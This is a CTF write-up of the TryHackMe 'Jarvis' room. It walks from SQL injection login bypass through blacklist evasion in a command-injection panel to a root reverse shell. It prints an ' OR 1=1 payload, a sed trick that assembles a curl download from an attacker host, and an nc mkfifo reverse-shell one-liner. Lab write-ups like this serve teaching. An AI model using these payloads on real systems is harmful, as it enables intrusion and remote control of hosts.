TryHackMe: Jarvis — SQLi to RCE to Accidental Root (CTF-Style)

The Jarvis room on TryHackMe was designed to teach basic SQL injection techniques within a structured CTF format, where each solved task yields a flag. While the original room walks you through with helpful hints and step-by-step questions, I chose to tackle it without relying on them — exploring the machine organically and pushing its boundaries.

That decision led to an unexpected outcome: I not only uncovered all the intended flags, but also rooted the entire box and discovered a secret flag that wasn’t referenced in any other write-ups I read. Interestingly, it seems even the room author may not have realized that this box could be rooted via an RCE chain. We’ll walk through that full exploitation path here.
🔍 Initial Recon

As always, I kicked off with enumeration:

nmap -sC -sV -oA nmap/nmap <target_ip>

Nmap revealed an Ubuntu server with up-to-date services. The HTTP server looked interesting, so I started poking around with gobuster while simultaneously checking the HTML source.

gobuster dir -u http://<target_ip> -w /path/to/raft-small-words.txt -o gobuster_output.txt

💡 Pro Tip: Always have background enumeration running. SecLists is a great resource for wordlists.
💻 Web Source Enumeration

Viewing the root page source, a few developer comments popped up, one of which contained a link to a script holding the first flag. This reinforced a pattern: always inspect HTML source code, especially on CTF-style boxes.
🧬 SQL Injection

Navigating to /portal, we spotted another juicy comment mentioning SQLi. Testing the login form with a classic payload:

' OR 1=1-- -

💥 Instant access.

Inside, we find a command execution interface — clearly vulnerable to command injection. Attempting a reverse shell using pentestmonkey payloads failed due to a blacklist, but harmless commands like ls and cd worked.
📂 Post-Login Enumeration

Command injection allowed access to internal files. Listing the directories, I found:

create.sql
node_modules/
server.js
flag5.txt

But trying to cat flag5.txt triggered a "Command disallowed" message.

✅ Workaround: less flag5.txt bypassed the filter and revealed the flag.
💣 RCE → Reverse Shell

At this point, I wasn't aware that rooting the box wasn’t intended. I kept pushing.

Blacklisted commands like nc, bash, python, and curl were blocked directly. To bypass, I created an indirect payload file using only allowed commands:

echo 'url http://<attacker_ip>/rev -o /tmp/rev' > /tmp/malicious_command
sed -i '1s/^/cu/' /tmp/malicious_command
chmod +x /tmp/malicious_command

That results in:

curl http://<attacker_ip>/rev -o /tmp/rev

📡 Hosting the rev payload with Python:

sudo python3 -m http.server 80

Payload content:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/f

After executing /tmp/malicious_command then /tmp/rev...

🎉 Shell obtained!
🏁 Unexpected: Already Root?

Running whoami returned root. That’s right — the web server was executing commands as root, a critical misconfiguration. Web apps should never run as root. They should run under constrained users like www-data.

From here, I pulled all the flags directly:

find / 2>/dev/null | grep -i flag | grep .txt
grep -r flag2 /home

🧪 Secret Flag & Server-Side Insights

Curious about the command blacklist, I inspected /home/ubuntu/avengers/server.js.

💎 Jackpot: A hardcoded list of blacklisted commands — confirming how commands like nc, curl, and bash were filtered.

🎁 Also found: MySQL credentials + a secret flag in the codebase:

flag4: sanitize_queries_mr_stark

The SQLi vulnerability stemmed from deliberately vulnerable code:

con.query('SELECT * FROM users WHERE username = ' + username + ' AND password = ' + password)

The usual prepared statements were commented out. This allowed classic injection using ' OR 1=1-- - to bypass authentication entirely.
🧠 Final Thoughts

This box was a blast. What was meant to be a basic SQLi tutorial turned into a deep dive into:

    SQL Injection exploitation

    HTML source code leaks

    Command injection with filtering

    Creative RCE bypass

    Accidental root via misconfiguration

    Source code review for secrets

Despite being labeled Easy, Jarvis taught practical web exploitation, lateral thinking, and the importance of privilege boundaries. The unintended root access made it all the more exciting.
